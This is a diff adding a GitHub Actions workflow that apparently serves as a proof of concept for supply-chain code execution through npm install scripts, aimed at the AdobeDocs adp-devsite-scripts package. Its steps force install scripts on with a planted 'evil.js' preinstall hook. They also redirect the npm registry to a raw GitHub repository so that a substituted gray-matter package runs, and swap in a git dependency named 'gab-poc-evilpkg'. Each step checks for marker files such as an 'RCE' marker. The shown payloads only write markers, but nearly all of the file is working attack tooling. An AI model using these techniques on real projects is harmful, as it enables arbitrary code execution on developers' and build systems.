@@ -1,0 +1,48 @@
+name: npm Gate Diag
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  d:
+    runs-on: ubuntu-latest
+    steps:
+      - name: inspect npm script gating
+        run: |
+          npm -v
+          echo "--- ignore-scripts:"; npm config get ignore-scripts || true
+          echo "--- config keys:"; npm config ls -l 2>/dev/null | grep -i -E 'script|allow' || true
+          echo "--- install-scripts help:"; npm install-scripts --help 2>&1 | head -30 || true
+      - name: variant A root preinstall
+        run: |
+          rm -rf /tmp/A && mkdir -p /tmp/A && cd /tmp/A
+          printf 'dangerously-allow-all-scripts=true\nignore-scripts=false\nforeground-scripts=true\naudit=false\nfund=false\nprogress=false\n' > .npmrc
+          printf 'require("fs").writeFileSync("/tmp/MARK_A","ROOT_SCRIPT_RAN")\n' > evil.js
+          printf '{"name":"a","version":"1.0.0","private":true,"scripts":{"preinstall":"node evil.js"}}\n' > package.json
+          npm install --no-save github:AdobeDocs/adp-devsite-scripts || echo A_INSTALL_FAILED
+          echo "A:"; cat /tmp/MARK_A 2>/dev/null || echo NO_A
+      - name: variant B registry redirect dependency postinstall
+        run: |
+          rm -rf /tmp/B && mkdir -p /tmp/B && cd /tmp/B
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/npmreg2/\naudit=false\nfund=false\nprogress=false\n' > .npmrc
+          printf '{"name":"b","version":"1.0.0","private":true,"dependencies":{"gray-matter":"4.0.5"}}\n' > package.json
+          npm install --no-save gray-matter@4.0.5 || echo B_INSTALL_FAILED
+          echo "B:"; cat /tmp/ADP_RCE_MARKER 2>/dev/null || echo NO_B
+      - name: variant C allow-scripts env
+        run: |
+          rm -rf /tmp/C && mkdir -p /tmp/C && cd /tmp/C
+          printf 'foreground-scripts=true\naudit=false\nfund=false\nprogress=false\n' > .npmrc
+          printf 'require("fs").writeFileSync("/tmp/MARK_C","ROOT_SCRIPT_RAN")\n' > evil.js
+          printf '{"name":"c","version":"1.0.0","private":true,"scripts":{"preinstall":"node evil.js"}}\n' > package.json
+          npm_config_allow_scripts=true npm_config_dangerously_allow_all_scripts=true npm install --no-save github:AdobeDocs/adp-devsite-scripts || echo C_INSTALL_FAILED
+          echo "C:"; cat /tmp/MARK_C 2>/dev/null || echo NO_C
+      - name: variant D git dependency prepare
+        run: |
+          rm -rf /tmp/D && mkdir -p /tmp/D && cd /tmp/D
+          printf 'foreground-scripts=true\naudit=false\nfund=false\nprogress=false\n' > .npmrc
+          printf '{"name":"d","version":"1.0.0","private":true,"dependencies":{"gray-matter":"github:PDFtoMark/gab-poc-evilpkg#main"}}\n' > package.json
+          npm install --no-save github:AdobeDocs/adp-devsite-scripts || echo D_INSTALL_FAILED
+          echo "D:"; cat /tmp/MARK_D 2>/dev/null || echo NO_D
+      - name: summary
+        if: always()
+        run: |
+          for m in /tmp/MARK_A /tmp/ADP_RCE_MARKER /tmp/MARK_C /tmp/MARK_D; do echo "$m: $(cat $m 2>/dev/null || echo absent)"; done
